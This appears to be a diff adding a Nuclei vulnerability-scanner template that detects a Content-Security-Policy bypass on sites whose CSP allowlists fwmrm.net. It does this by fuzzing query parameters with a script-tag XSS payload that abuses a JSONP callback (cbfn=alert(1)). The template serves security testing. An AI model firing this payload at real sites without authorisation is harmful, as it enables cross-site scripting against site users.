@@ -1,0 +1,55 @@
+id: fwmrm-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - FWM RM
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,fwmrm,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "fwmrm.net"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: fwmrm_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://7b936.v.fwmrm.net/ad/g/1?nw=1&csid=1&resp=json&cbfn=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "fwmrm_csp_xss == true"
+# digest: 4a0a00473045022100b2811ebb4246cbac66e4ba7d0a5f589e334e9d3292ccc34d69a73d346b21df1d0220154e6fe8ab8a3c7963fbd34fb7163372789d9702255191b5290351bada891091:922c64590222798bb761d5b6d8e72950
